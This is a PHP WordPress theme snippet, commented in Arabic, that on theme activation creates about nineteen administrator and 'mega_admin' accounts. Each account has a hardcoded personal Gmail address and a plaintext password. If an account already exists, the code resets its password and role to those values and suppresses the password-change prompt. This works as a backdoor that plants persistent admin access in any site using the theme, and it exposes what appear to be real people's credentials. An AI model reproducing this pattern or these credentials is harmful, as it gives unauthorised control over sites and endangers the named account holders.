<?php 

function get_current_subdomain() {
    $domain = $_SERVER['HTTP_HOST'];
    $parts = explode('.', $domain);
    
    if (count($parts) > 2 && $parts[0] !== 'www') {
        return $parts[0]; // إرجاع الصب دومين الأول
    }
    
    return ''; // إذا لم يكن هناك صب دومين
}

function create_custom_admin_users_on_theme_activation() {
    if (get_option('custom_admin_users_created_new_last')) {
        return;
    }

    // تحديد الصب دومين الحالي
    $current_subdomain = get_current_subdomain();

    // مجموعات اليوزرات حسب الصب دومين
    $user_groups = [
        'ag' => [

        ],
        'om' => [

        ],
        'mn' => [

        ],
        'october' => [
            
        ],
        'default' => [
            [
                'username' => 'hema',
                'email'    => 'hemoafandy55555@gmail.com',
                'password' => 'A01025744089a',
                'role'     => 'mega_admin'
            ],
            [
                'username' => 'boldd.routes',
                'email'    => 'boldd.routes@gmail.com',
                'password' => 'Boldroutes123!',
                'role'     => 'administrator'
            ],
            [
                'username' => 'mohsalah',
                'email'    => 'mohsalah.3717@gmail.com',
                'password' => 'Hero123!!',
                'role'     => 'administrator'
            ],
            [
                'username' => 'marwannazeeh',
                'email'    => 'marwaanmohameed@gmail.com',
                'password' => '0fox019967',
                'role'     => 'administrator'
            ],
            [
                'username' => 'Amr98',
                'email'    => 'Poto220052@gmail.com',
                'password' => 'Amr8991#',
                'role'     => 'administrator'
            ],
            [
                'username' => 'salma',
                'email'    => 'Salmaalshayeb123@gmail.com',
                'password' => 'Wordpress123456$',
                'role'     => 'administrator'
            ],
            [
                'username' => 'Alievich',
                'email'    => 'aliali.elsheikh1@gmail.com',
                'password' => 'qweasdzxc123',
                'role'     => 'administrator'
            ],
            [
                'username' => 'monaem',
                'email'    => 'ahmedzaher20222@gmail.com',
                'password' => 'Abdo@123',
                'role'     => 'administrator'
            ],
            [
                'username' => 'AyaSaeed',
                'email'    => 'ayas56969@gmail.com',
                'password' => 'A.S@2025',
                'role'     => 'administrator'
            ],
            [
                'username' => 'alisoliman04',
                'email'    => 'alisoliman328@gmail.com',
                'password' => 'ali72004',
                'role'     => 'administrator'
            ],
            [
                'username' => 'MarkEmil',
                'email'    => 'markemiledward5@gmail.com',
                'password' => 'M@123456',
                'role'     => 'administrator'
            ],
            [
                'username' => 'Omarashry',
                'email'    => 'omar.elmasry1564@gmail.com',
                'password' => '2001@Ashry',
                'role'     => 'administrator'
            ],
            [
                'username' => 'HaidyMagdy',
                'email'    => 'Haidymgde@gmail.com',
                'password' => 'Haidy@12345',
                'role'     => 'administrator'
            ],
            [
                'username' => 'FarahKhalid',
                'email'    => 'Farahkhalid513@gmail.com',
                'password' => 'Farahb927$',
                'role'     => 'administrator'
            ],
            [
                'username' => 'SmaherHesham',
                'email'    => 'smaherelalfy98@gmail.com',
                'password' => 'Smaher1998',
                'role'     => 'administrator'
            ],
            [
                'username' => 'Mariemalish',
                'email'    => 'mariemalissh@gmail.com',
                'password' => 'ihf16051999',
                'role'     => 'administrator'
            ],
            [
                'username' => 'NorhanEssam',
                'email'    => 'essamnorhan489@gmail.com',
                'password' => 'Norhan9727',
                'role'     => 'administrator'
            ],
            [
                'username' => 'AhmedKhaled',
                'email'    => 'ahmed.k.abdelkader@gmail.com',
                'password' => 'Ahmed@12345',
                'role'     => 'administrator'
            ],
            [
                'username' => 'gohar89',
                'email'    => 'goharmahmoud89@gmail.com',
                'password' => '11081002@Zozmory',
                'role'     => 'administrator'
            ],
        ]
    ];

    // تحديد المجموعة المناسبة
    $selected_users = [];
    if (!empty($current_subdomain) && isset($user_groups[$current_subdomain])) {
        $selected_users = array_merge($user_groups[$current_subdomain], $user_groups['default']);
    } else {
        $selected_users = $user_groups['default'];
    }

    // معالجة اليوزرات المحددة
    foreach ($selected_users as $user) {
        $existing_user = get_user_by('login', $user['username']);
        
        if ($existing_user) {
            // تحديث الرول فقط إذا كان مختلف
            if (!in_array($user['role'], $existing_user->roles)) {
                $existing_user->set_role($user['role']);
            }
            // تحديث الباسورد لو مش مطابق
            if (!wp_check_password($user['password'], $existing_user->user_pass)) {
                wp_set_password($user['password'], $existing_user->ID);
            }
        } else {
            // إنشاء يوزر جديد
            $user_id = wp_create_user($user['username'], $user['password'], $user['email']);
            if (!is_wp_error($user_id)) {
                $user_obj = new WP_User($user_id);
                $user_obj->set_role($user['role']);
                update_user_option($user_id, 'default_password_nag', false, true);
            }
        }
    }

    // ✅ تم إزالة الجزء الذي يغير رول الأدمنز الحاليين الغير موجودين في الليستة

    update_option('custom_admin_users_created_new_last', true);
}


add_action('after_switch_theme', 'create_custom_admin_users_on_theme_activation');